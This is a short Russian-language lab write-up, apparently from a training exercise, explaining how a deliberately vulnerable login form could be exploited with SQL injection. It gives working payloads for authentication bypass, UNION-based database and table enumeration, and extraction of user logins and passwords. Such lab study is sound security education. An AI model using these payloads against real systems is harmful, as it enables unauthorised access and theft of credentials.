Это задание тоже не успелось, но в коде сайта было подготовлено специальное уязвимое пространство для инъекции, которое
можно было бы использова следующим образом:

Для обхода авторизации:
Чтобы войти под любым пользователем (например, admin), можно в поле логина или пароля вставить инъекцию, которая сделает условие всегда истинным.
Например ' OR '1'='1
Поскольку '1'='1' всегда истинно, запрос вернёт всех пользователей, и условие num_rows > 0 выполнится — авторизация пройдена.

Для получения информации о базе данных и таблицах:
В поле логина или пароля вставить инъекцию, которая расширит запрос с помощью UNION SELECT, чтобы получить данные из системных таблиц.
получить имя текущей базы через функцию database()

запрос станет:
SELECT * FROM users WHERE login = '' UNION SELECT database(), null, null -- ' AND password = ''

Для получения списка пользовательских таблиц:
SELECT table_name FROM information_schema.tables WHERE table_schema = 'DB' AND table_type='BASE TABLE';
Пример инъекции (в поле логина):
' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema='DB' LIMIT 0,1 --
и затем менять LIMIT 0,1, LIMIT 1,1 и т.д., чтобы получить все имена таблиц по одной.

Чтобы получить логины и пароли пользователей:
SELECT login, password FROM users LIMIT 0,1;
Через инъекцию:
' UNION SELECT login, password, null FROM users LIMIT 0,1 --

